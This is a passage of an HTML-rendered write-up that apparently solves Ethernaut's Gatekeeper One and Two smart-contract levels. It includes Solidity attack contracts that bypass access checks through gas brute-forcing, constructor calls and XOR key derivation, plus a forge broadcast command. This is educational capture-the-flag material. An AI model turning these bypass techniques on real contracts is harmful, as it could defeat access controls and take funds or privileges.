&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Entrant : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(gateOne&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;entrant&lt;&#x2F;span&gt;&lt;span&gt;()))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    GatekeeperOne public gateOne &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GatekeeperOne&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4742252E47788a20b2C78a1343DEE68EC8De3804&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; uint32(uint64(_gateKey)) != uint64(_gateKey)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint16 third &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint16&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint160&lt;&#x2F;span&gt;&lt;span&gt;(tx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;origin))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        uint32 two &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint32&lt;&#x2F;span&gt;&lt;span&gt;(third)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        bytes8 one &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes8&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xdeadbeef&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;two))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        bytes8 _gateKey &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;one&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;(uint i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;500&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;            (bool success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(gateOne)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;call{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;gas &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8191 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;i}(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;enter(bytes8)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;_gateKey))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;GatekeeperOneSolve.s.sol:GatekeeperOneSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;14-gatekeeper-two&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#14-gatekeeper-two&quot; aria-label=&quot;Anchor link for: 14-gatekeeper-two&quot;&gt;14 Gatekeeper Two&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;GatekeeperTwo.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract GatekeeperTwo {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  address public entrant&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gateOne&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;tx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;origin)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gateTwo&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    uint x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    assembly { &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;extcodesize&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;caller&lt;&#x2F;span&gt;&lt;span&gt;()) }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gateThree&lt;&#x2F;span&gt;&lt;span&gt;(bytes8 _gateKey) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint64&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes8&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender)))) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint64&lt;&#x2F;span&gt;&lt;span&gt;(_gateKey) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;(uint64)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;max)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;enter&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes8 _gateKey&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public gateOne gateTwo gateThree&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;_gateKey&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    entrant &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;tx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;origin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Similiar to gatekeeper one, to pass &lt;code&gt;gateOne()&lt;&#x2F;code&gt; here wee need to call from a contract.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;gateTwo()&lt;&#x2F;code&gt; checks that the caller contract code should zero. You think its impossible? Not at all.&lt;&#x2F;li&gt;
&lt;li&gt;Yes, code inside contract constructor won&#x27;t be stored on blockchain. So, we can call the &lt;code&gt;enter()&lt;&#x2F;code&gt; from our attack contract constructor.&lt;&#x2F;li&gt;
&lt;li&gt;To pass the &lt;code&gt;gateThree()&lt;&#x2F;code&gt; we need to simple XOR operation. To get the &lt;code&gt;gateKey()&lt;&#x2F;code&gt; we need to do &lt;code&gt;uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))&lt;&#x2F;code&gt; XOR &lt;code&gt;type(uint64).max&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;GatekeeperTwoSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{GatekeeperTwo} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;GatekeeperTwo.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract GatekeeperTwoSolve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    GatekeeperTwo public gateTwo &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GatekeeperTwo&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9C11F689500821ffE630e6CFea7aC45C7226040c&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Entrant : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(gateTwo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;entrant&lt;&#x2F;span&gt;&lt;span&gt;()))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Entrant : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(gateTwo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;entrant&lt;&#x2F;span&gt;&lt;span&gt;()))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;        GatekeeperTwo gateTwo &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GatekeeperTwo&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9C11F689500821ffE630e6CFea7aC45C7226040c&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        uint64 max &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;(uint64)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;max&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        uint64 hsh &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint64&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes8&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)))))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
